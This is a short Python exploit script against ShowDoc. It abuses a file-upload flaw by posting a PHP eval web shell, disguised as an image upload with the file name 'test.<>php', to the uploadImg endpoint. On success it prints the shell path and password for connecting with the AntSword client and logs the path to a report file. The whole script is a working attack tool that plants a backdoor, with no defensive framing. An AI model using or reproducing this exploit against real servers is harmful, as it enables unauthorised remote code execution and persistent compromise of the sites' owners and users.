import json
import requests
import time
import buter
import wirtefile

filename = "./reps/showdocfileupload-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=--------------------------921378126371623762173617"
    }
poc = '/index.php?s=/home/page/uploadImg'
data = '''----------------------------921378126371623762173617
Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
Content-Type: text/plain

<?php echo 'Rank';@eval($_POST[Rank_Tmd])?>
----------------------------921378126371623762173617--'''
def sdfileup(url):
    try:
        rep = requests.post(url=url+poc,headers=headers,data=data,verify=False,timeout=3)
        if '"success":1' in rep.text and rep.status_code == 200:
            shell_path = json.loads(rep.text)["url"] + " pass : Rank_Tmd"
            print(buter.colors.GREEN + f"存在showdoc文件上传漏洞 shell_path : {shell_path} 使用蚁剑连接 " + buter.colors.END)
            wirtefile.writefiles(filename,shell_path)
        else:
            print(buter.colors.RED + f"未发现showdoc文件上传漏洞 url : {url}"+ buter.colors.END)
    except Exception as e:
        print(buter.colors.END +f"ERROR : {e}")

